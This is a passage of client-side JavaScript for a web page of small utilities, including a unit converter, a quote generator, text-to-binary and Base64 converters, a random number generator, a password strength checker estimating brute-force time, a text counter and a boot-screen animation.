        else if (type === 'time') units = unitSets.time.units;
        else if (type === 'speed') units = unitSets.speed.units;
        else if (type === 'volume') units = unitSets.volume.units;
        else if (type === 'area') units = unitSets.area.units;
        else if (type === 'energy') units = unitSets.energy.units;
        else if (type === 'pressure') units = unitSets.pressure.units;
        
        fromUnit.innerHTML = '';
        toUnit.innerHTML = '';
        units.forEach(u => {
            fromUnit.appendChild(new Option(u, u));
            toUnit.appendChild(new Option(u, u));
        });
        if (type === 'temp') {
            fromUnit.value = 'Celsius';
            toUnit.value = 'Fahrenheit';
        } else {
            fromUnit.value = units[0];
            toUnit.value = units[1] || units[0];
        }
    }
    
    // تبدیل دما (دستکاری ویژه)
    function convertTemperature(value, from, to) {
        let celsius;
        if (from === 'Celsius') celsius = value;
        else if (from === 'Fahrenheit') celsius = (value - 32) * 5/9;
        else if (from === 'Kelvin') celsius = value - 273.15;
        else return value;
        if (to === 'Celsius') return celsius;
        if (to === 'Fahrenheit') return celsius * 9/5 + 32;
        if (to === 'Kelvin') return celsius + 273.15;
        return value;
    }
    
    // تبدیل عمومی برای واحدهای خطی (غیردما)
    function convertLinear(value, from, to, set) {
        const baseValue = value * set.toBase[from];
        return set.fromBase(baseValue, to);
    }
    
    function convert() {
        const type = convType.value;
        let value = parseFloat(convValue.value);
        if (isNaN(value)) { convOutput.innerHTML = 'Invalid number'; return; }
        let result;
        
        if (type === 'temp') {
            result = convertTemperature(value, fromUnit.value, toUnit.value);
            convOutput.innerHTML = `${value} ${fromUnit.value} = ${result.toFixed(2)} ${toUnit.value}`;
        } else {
            let set;
            switch (type) {
                case 'length': set = unitSets.length; break;
                case 'weight': set = unitSets.weight; break;
                case 'time': set = unitSets.time; break;
                case 'speed': set = unitSets.speed; break;
                case 'volume': set = unitSets.volume; break;
                case 'area': set = unitSets.area; break;
                case 'energy': set = unitSets.energy; break;
                case 'pressure': set = unitSets.pressure; break;
                default: return;
            }
            result = convertLinear(value, fromUnit.value, toUnit.value, set);
            // انتخاب تعداد ارقام اعشاری مناسب
            let precision = 6;
            if (Math.abs(result) < 0.01) precision = 8;
            if (Math.abs(result) > 1000) precision = 2;
            convOutput.innerHTML = `${value} ${fromUnit.value} = ${result.toFixed(precision)} ${toUnit.value}`;
        }
    }
    
    if (convType) {
        convType.addEventListener('change', updateUnitOptions);
        updateUnitOptions();
        convertBtn.addEventListener('click', convert);
        convValue.addEventListener('input', convert);
        convert();
    }

    // ---------- 5. Motivational Quote Generator ----------
    const newQuoteBtn = document.getElementById('newQuoteBtn');
    const quoteOutput = document.getElementById('quoteOutput');
    const quotes = [
        "The only way to do great work is to love what you do. – Steve Jobs",
    "Code is like humor. When you have to explain it, it’s bad. – Cory House",
    "Simplicity is the soul of efficiency. – Austin Freeman",
    "First, solve the problem. Then, write the code. – John Johnson",
    "Experience is the name everyone gives to their mistakes. – Oscar Wilde",
    "The best way to predict the future is to implement it. – David Heinemeier Hansson",
    "Any fool can write code that a computer can understand. Good programmers write code that humans can understand. – Martin Fowler",
    "Security is not a product, but a process. – Bruce Schneier",
    "The quieter you become, the more you are able to hear. – Kali Linux",
    "Stay hungry, stay foolish. – Steve Jobs",
    "Talk is cheap. Show me the code. – Linus Torvalds",
    "Software is a gas; it expands to fill its container. – Nathan Myhrvold",
    "Fix the cause, not the symptom. – Steve Maguire",
    "Optimism is an occupational hazard of programming. – Kent Beck",
    "The function of good software is to make the complex appear simple. – Grady Booch",
    "In theory, theory and practice are the same. In practice, they’re not. – Yoggi Berra",
    "Make it work, make it right, make it fast. – Kent Beck",
    "Before software can be reusable it first has to be usable. – Ralph Johnson",
    "Programming is not about typing, it's about thinking. – Rich Hickey",
    "The most dangerous phrase in the language is 'We've always done it this way.' – Grace Hopper",
    "Copy and paste is a design error. – David Parnas",
    "It's not at all important to get it right the first time. It's vitally important to get it right the last time. – Andrew Hunt",
    "The only real mistake is the one from which we learn nothing. – Henry Ford",
    "Perfection is achieved not when there is nothing more to add, but when there is nothing left to take away. – Antoine de Saint-Exupéry",
    "The best performance improvement is the transition from the nonworking state to the working state. – J. Osterhout",
    "Sometimes it pays to stay in bed on Monday, rather than spending the rest of the week debugging Monday's code. – Dan Salomon",
    "Hardware eventually fails. Software eventually works. – Michael Hart",
    "It's not a bug – it's an undocumented feature. – Anonymous",
    "Good code is its own best documentation. – Steve McConnell",
    "The only way to learn a new programming language is by writing programs in it. – Dennis Ritchie",
    "Walking on water and developing software from a specification are easy if both are frozen. – Edward V. Berard",
    "The trouble with programmers is that you can never tell what a programmer is doing until it's too late. – Seymour Cray",
    "Measuring programming progress by lines of code is like measuring aircraft building progress by weight. – Bill Gates",
    "Programming today is a race between software engineers striving to build bigger and better idiot-proof programs, and the universe trying to produce bigger and better idiots. So far, the universe is winning. – Rick Cook",
    "You can't have great software without a great team, and most software teams behave like dysfunctional families. – Jim McCarthy",
    "Believe you can and you're halfway there. – Theodore Roosevelt",
    "It does not matter how slowly you go as long as you do not stop. – Confucius",
    "Our greatest glory is not in never falling, but in rising every time we fall. – Confucius",
    "Everything you've ever wanted is on the other side of fear. – George Addair",
    "Success is walking from failure to failure with no loss of enthusiasm. – Winston Churchill",
    "The only limit to our realization of tomorrow is our doubts of today. – Franklin D. Roosevelt",
    "Do what you can, with what you have, where you are. – Theodore Roosevelt",
    "Act as if what you do makes a difference. It does. – William James",
    "Keep your face always toward the sunshine—and shadows will fall behind you. – Walt Whitman",
    "What you get by achieving your goals is not as important as what you become by achieving your goals. – Zig Ziglar"
    ];
    if (newQuoteBtn) {
        newQuoteBtn.addEventListener('click', () => {
            const random = quotes[Math.floor(Math.random() * quotes.length)];
            quoteOutput.innerHTML = `“${random}”`;
        });
        newQuoteBtn.click();
    }


        // ---------- 7. Text ↔ Binary Converter ----------
    const textForBinary = document.getElementById('textForBinary');
    const textToBinaryBtn = document.getElementById('textToBinaryBtn');
    const binaryResult = document.getElementById('binaryResult');
    const binaryForText = document.getElementById('binaryForText');
    const binaryToTextBtn = document.getElementById('binaryToTextBtn');
    const textResult = document.getElementById('textResult');
    const copyBinaryResultBtn = document.getElementById('copyBinaryResultBtn');
    const copyTextResultBtn = document.getElementById('copyTextResultBtn');

    function textToBinary(str) {
        return str.split('').map(ch => ch.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
    }
    function binaryToText(bin) {
        const bytes = bin.trim().split(/\s+/);
        let result = '';
        for (let byte of bytes) {
            if (!/^[01]{8}$/.test(byte)) return '❌ Invalid binary (use 8-bit bytes separated by space)';
            result += String.fromCharCode(parseInt(byte, 2));
        }
        return result;
    }
    if (textToBinaryBtn) {
        textToBinaryBtn.addEventListener('click', () => {
            const txt = textForBinary.value;
            if (!txt.trim()) { binaryResult.innerHTML = '⚠️ Enter some text.'; return; }
            binaryResult.innerHTML = textToBinary(txt);
        });
    }
    if (binaryToTextBtn) {
        binaryToTextBtn.addEventListener('click', () => {
            const bin = binaryForText.value.trim();
            if (!bin) { textResult.innerHTML = '⚠️ Enter binary.'; return; }
            textResult.innerHTML = binaryToText(bin);
        });
    }
    if (copyBinaryResultBtn) {
        copyBinaryResultBtn.addEventListener('click', () => {
            const txt = binaryResult.innerText;
            if (txt && !txt.includes('⚠️')) { navigator.clipboard.writeText(txt); copyBinaryResultBtn.textContent = '✓ Copied!'; setTimeout(() => copyBinaryResultBtn.textContent = 'Copy Binary', 1500); }
        });
    }
    if (copyTextResultBtn) {
        copyTextResultBtn.addEventListener('click', () => {
            const txt = textResult.innerText;
            if (txt && !txt.includes('⚠️')) { navigator.clipboard.writeText(txt); copyTextResultBtn.textContent = '✓ Copied!'; setTimeout(() => copyTextResultBtn.textContent = 'Copy Text', 1500); }
        });
    }

    // ---------- 8. Random Number Generator ----------
    const randMin = document.getElementById('randMin');
    const randMax = document.getElementById('randMax');
    const generateRandomBtn = document.getElementById('generateRandomBtn');
    const randomResult = document.getElementById('randomResult');
    if (generateRandomBtn) {
        generateRandomBtn.addEventListener('click', () => {
            let min = parseInt(randMin.value);
            let max = parseInt(randMax.value);
            if (isNaN(min)) min = 1;
            if (isNaN(max)) max = 100;
            if (min > max) { [min, max] = [max, min]; }
            const rand = Math.floor(Math.random() * (max - min + 1)) + min;
            randomResult.innerHTML = `Random number: <strong>${rand}</strong> (between ${min} and ${max})`;
        });
        generateRandomBtn.click();
    }

    // ---------- 9. Base64 Encoder / Decoder ----------
    const base64Input = document.getElementById('base64Input');
    const encodeBase64Btn = document.getElementById('encodeBase64Btn');
    const decodeBase64Btn = document.getElementById('decodeBase64Btn');
    const base64Output = document.getElementById('base64Output');
    if (encodeBase64Btn) {
        encodeBase64Btn.addEventListener('click', () => {
            const text = base64Input.value;
            if (!text) { base64Output.innerHTML = '⚠️ Enter text to encode.'; return; }
            base64Output.innerHTML = btoa(text);
        });
    }
    if (decodeBase64Btn) {
        decodeBase64Btn.addEventListener('click', () => {
            const b64 = base64Input.value;
            if (!b64) { base64Output.innerHTML = '⚠️ Enter Base64 to decode.'; return; }
            try {
                base64Output.innerHTML = atob(b64);
            } catch(e) {
                base64Output.innerHTML = '❌ Invalid Base64 string.';
            }
        });
    }

// ---------- 10. Password Strength Checker (Accurate - based on crack time) ----------
const passwordInput = document.getElementById('passwordInput');
const checkStrengthBtn = document.getElementById('checkStrengthBtn');
const strengthOutput = document.getElementById('strengthOutput');

const commonPasswords = [
    'password', '123456', '12345678', 'qwerty', 'abc123', 'admin', 
    'welcome', 'letmein', '12345', 'password123', 'root', 'iloveyou', 
    'monkey', 'dragon', 'sunshine', 'princess', 'master', 'shadow'
];

function getPasswordStrength(pwd) {
    // 1. Check common passwords
    if (commonPasswords.includes(pwd.toLowerCase())) {
        return {
            strengthLevel: 'Very Weak (Common)',
            crackTime: 'instantly',
            seconds: 0,
            charsetSize: 0,
            combinations: 0
        };
    }

    const len = pwd.length;
    if (len === 0) {
        return { strengthLevel: 'No password', crackTime: '', seconds: 0, charsetSize: 0, combinations: 0 };
    }

    const hasLower = /[a-z]/.test(pwd);
    const hasUpper = /[A-Z]/.test(pwd);
    const hasDigit = /[0-9]/.test(pwd);
    const hasSpecial = /[^a-zA-Z0-9]/.test(pwd);

    // محاسبه دقیق فضای کاراکترها
    let charsetSize = 0;
    if (hasLower) charsetSize += 26;
    if (hasUpper) charsetSize += 26;
    if (hasDigit) charsetSize += 10;
    if (hasSpecial) charsetSize += 33; // ~33 کاراکتر نماد رایج روی کیبورد US

    // اگر هیچ نوع کاراکتری شناسایی نشد (نباید رخ دهد) پیش‌فرض 26
    if (charsetSize === 0) charsetSize = 26;

    // تعداد ترکیبات ممکن = (فضای کاراکتر) ^ (طول رمز)
    const combinations = Math.pow(charsetSize, len);
    const guessesPerSecond = 1_000_000_000; // 1 میلیارد حدس در ثانیه (سخت‌افزار قدرتمند)
    let seconds = combinations / guessesPerSecond;

    // تعیین سطح امنیتی بر اساس زمان کرک (استاندارد NIST-like)
    let strengthLevel;
    if (seconds < 1) strengthLevel = 'Very Weak';
    else if (seconds < 60) strengthLevel = 'Very Weak';      // کمتر از 1 دقیقه
    else if (seconds < 3600) strengthLevel = 'Weak';         // کمتر از 1 ساعت
    else if (seconds < 86400) strengthLevel = 'Medium';      // کمتر از 1 روز
    else if (seconds < 31536000) strengthLevel = 'Strong';   // کمتر از 1 سال
    else if (seconds < 31536000 * 100) strengthLevel = 'Very Strong'; // کمتر از 100 سال
    else strengthLevel = 'Extremely Strong';                 // بیش از 100 سال

    // فرمت‌بندی زمان برای نمایش
    let crackTime;
    if (seconds < 1) crackTime = 'less than 1 second';
    else if (seconds < 60) crackTime = `${Math.round(seconds)} seconds`;
    else if (seconds < 3600) crackTime = `${Math.round(seconds / 60)} minutes`;
    else if (seconds < 86400) crackTime = `${Math.round(seconds / 3600)} hours`;
    else if (seconds < 31536000) crackTime = `${Math.round(seconds / 86400)} days`;
    else if (seconds < 31536000 * 100) crackTime = `${Math.round(seconds / 31536000)} years`;
    else crackTime = 'centuries (>100 years)';

    return { strengthLevel, crackTime, seconds, charsetSize, combinations };
}

if (checkStrengthBtn) {
    checkStrengthBtn.addEventListener('click', () => {
        const pwd = passwordInput.value;
        if (!pwd) {
            strengthOutput.innerHTML = 'Enter a password.';
            return;
        }
        const { strengthLevel, crackTime, charsetSize, combinations } = getPasswordStrength(pwd);
        
        // رنگ‌بندی مناسب
        let color;
        switch (strengthLevel) {
            case 'Very Weak (Common)':
            case 'Very Weak':
                color = '#f44'; break;
            case 'Weak':
                color = '#ff8c00'; break;
            case 'Medium':
                color = '#ff0'; break;
            case 'Strong':
                color = '#8bc34a'; break;
            case 'Very Strong':
                color = '#0f0'; break;
            case 'Extremely Strong':
                color = '#0f0'; break;
            default:
                color = '#fff';
        }
        
        strengthOutput.innerHTML = `
            Strength: <span style="color:${color}; font-weight:bold;">${strengthLevel}</span><br>
            Estimated brute-force time: ${crackTime}<br>
            <span style="font-size:0.7rem; color:#aaa;">(based on ${charsetSize} character set, ${combinations.toExponential(2)} combinations, 1e9 guesses/sec)</span>
        `;
    });
}

    // ---------- 11. Character / Word / Line Counter ----------
    const counterText = document.getElementById('counterText');
    const countBtn = document.getElementById('countBtn');
    const counterResult = document.getElementById('counterResult');
    if (countBtn) {
        countBtn.addEventListener('click', () => {
            const text = counterText.value;
            const chars = text.length;
            const words = text.trim() === '' ? 0 : text.trim().split(/\s+/).length;
            const lines = text === '' ? 0 : text.split(/\r\n|\r|\n/).length;
            counterResult.innerHTML = `Characters: ${chars} | Words: ${words} | Lines: ${lines}`;
        });
        countBtn.click();
    }
})();







// ============================================
// Prevent browser from saving scroll position
// ============================================
history.scrollRestoration = 'manual';

// ============================================
// Boot Screen Animation with scroll to top
// ============================================
document.addEventListener('DOMContentLoaded', () => {
    const bootScreen = document.getElementById('bootScreen');
    
    // Hide boot screen after animation completes
    setTimeout(() => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
            // 🔥 Force scroll to top after boot
            window.scrollTo(0, 0);
        }, 500);
    }, 6000);
    
    // Allow skipping with any key press or click
    const skipBoot = () => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
            // 🔥 Force scroll to top when skipping
            window.scrollTo(0, 0);
        }, 500);
    };
    
    document.addEventListener('keydown', skipBoot, { once: true });
    bootScreen.addEventListener('click', skipBoot, { once: true });
});